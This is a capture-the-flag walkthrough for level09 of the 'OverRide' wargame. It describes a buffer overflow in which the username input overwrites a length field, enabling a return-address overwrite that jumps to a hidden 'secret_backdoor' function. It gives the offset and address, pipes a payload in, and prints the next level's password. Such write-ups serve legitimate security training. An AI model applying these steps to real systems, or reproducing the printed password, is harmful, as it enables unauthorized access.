# level09 walkthrough

## the binary
``` shell
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: ffarkas
>: Welcome, ffarkas
>: Msg @Unix-Dude
>>: Hello!
>: Msg sent!
```

## methodology
- buffer overflow attack

The binary prompts for a username and message upon execution. By examining the list of functions, we find a `secret_backdoor` function that is not called in the main execution path. This function uses `system` to execute a command. Our task is therefore simple:

- find a way to cause a buffer overflow when entering the input (since `fgets` is used, we need to overflow the buffer by knowing the allocated memory for each array)
- overwrite and control the `EIP` register

The binary uses a structure to manage the data:
``` C
typedef struct s_msg {
	char user_str[40];
	char msg_str[140];
	int str_len;
}	t_msg;
```

The input values are handled by `set_username` and `set_msg` functions respectively:
``` vbnet
F_HANDLE_MSG():
    set message length to 0x8c
        └─> msg.str_len = 140

    F_SET_USERNAME():
        └─ input username
        └─ load into local array
        └─ copy first 0x28 characters to structure
            └─> 40x (msg->user_str[i] = array[i])

    F_SET_MSG():
        └─ input message
        └─ load into local array
        └─ use strncpy to copy msg.str_len characters
            └─> strncpy(msg->msg_str, array, msg->str_len)
```

The first part of the overflow is evident in the source code logic - we use 40 characters reserved for the username and set the `msg.str_len` to the maximum possible value using two hexadecimal digits (8 bits):
``` vbnet
user_str -> 40 characters
str_len -> 0xff (255)
```

As we inspect the `EIP` through its manipulations, we can estimate its position relative to the base of the stack:
``` vbnet
0x00000000000008c4 <+4>:	sub    $0xc0,%rsp
                                        └─> 192 ----┐
0x00000000000009cd <+0>:	push   %rbp             |--> EIP is at base + 200
                                     └─> 8 ---------┘
```

The final piece we need is the address of the `secret_backdoor` function:
``` shell
0x000055555555488c
```

Using this information, we can craft the final payload, spawn an interactive `/bin/sh` shell, and execute the `cat` command to display the flag.
- unfortunately, the shell does not work after executing the first command

## flag
``` shell
level09@OverRide:~$ python /tmp/payload09 > tmp/flag9
level09@OverRide:~$ cat /tmp/flag9 - | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
